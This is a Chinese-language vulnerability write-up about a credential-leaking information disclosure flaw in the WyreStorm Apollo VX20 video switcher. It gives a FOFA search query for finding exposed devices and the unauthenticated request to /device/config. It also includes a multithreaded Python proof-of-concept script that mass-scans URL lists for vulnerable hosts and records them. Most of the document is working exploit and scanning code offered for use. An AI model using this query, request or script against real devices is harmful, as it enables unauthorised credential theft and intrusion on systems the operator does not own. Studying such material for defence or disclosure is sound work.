# WyreStorm Apollo VX20 信息泄露漏洞

### 漏洞描述

Apollo VX20具有多个视频输入和输出端口，可以将不同的视频源（如电视机、投影仪、游戏机、电脑等）连接到不同的显示设备上。通过使用Apollo VX20，用户可以轻松切换和控制不同的视频信号，以实现灵活的多源多目标视频分发和管理。

该系统存在敏感信息泄露漏洞，攻击者通过该漏洞可以获取凭证等信息。

### fofa语法

```
icon_hash="-893957814"
```

### 漏洞复现

```
GET /device/config HTTP/1.1
```

![image.png](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719830802788-6a40423c-a93e-4153-89b1-ae633849d9de.png?x-oss-process=image%2Fformat%2Cwebp%2Fresize%2Cw_937%2Climit_0)

### poc脚本

~~~markdown
import sys,requests,time,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

# 定义程序的横幅
def banner():
    test = """
██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██████╗ ██╗   ██╗    ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ 
██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗╚██╗ ██╔╝    ████╗ ████║██╔══██╗╚══███╔╝██║  ██║██╔══██╗
███████║███████║██║     █████╔╝     ██████╔╝ ╚████╔╝     ██╔████╔██║███████║  ███╔╝ ███████║███████║
██╔══██║██╔══██║██║     ██╔═██╗     ██╔══██╗  ╚██╔╝      ██║╚██╔╝██║██╔══██║ ███╔╝  ██╔══██║██╔══██║
██║  ██║██║  ██║╚██████╗██║  ██╗    ██████╔╝   ██║       ██║ ╚═╝ ██║██║  ██║███████╗██║  ██║██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝    ╚═╝       ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
                                                      version:1.1.0
                                                      author:mazha.top                                    
"""
    print(test)

# 主函数，解析命令行参数并调用相应的功能函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="WyreStorm Apollo VX20 信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
def poc(target):
    payload_url = '/device/config'
    url = target + payload_url
    headers = {
        'Sec-Ch-Ua':'"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site':'same-origin',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-User':'?1',
        'Sec-Fetch-Dest':'document',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Priority':'u=0, i',
        'Connection':'close',
    }
    
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False)
        
        if res.status_code == 200:
            print(f"[+]{GREEN}该网站存在信息泄露漏洞，url为 {target}\n{RESET}")
            with open("result.txt","a",encoding="utf-8") as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该网站不存在信息泄露漏洞")

    except Exception as e:
        print(f"[*]该网站无法访问")

# 程序入口点
if __name__ == '__main__':
    main()

~~~

### py脚本使用

```
python3 脚本文件名 -u "http://127.0.0.1"  # 测试单个url
python3 脚本文件名 -f url.txt             # 测试多个url
```

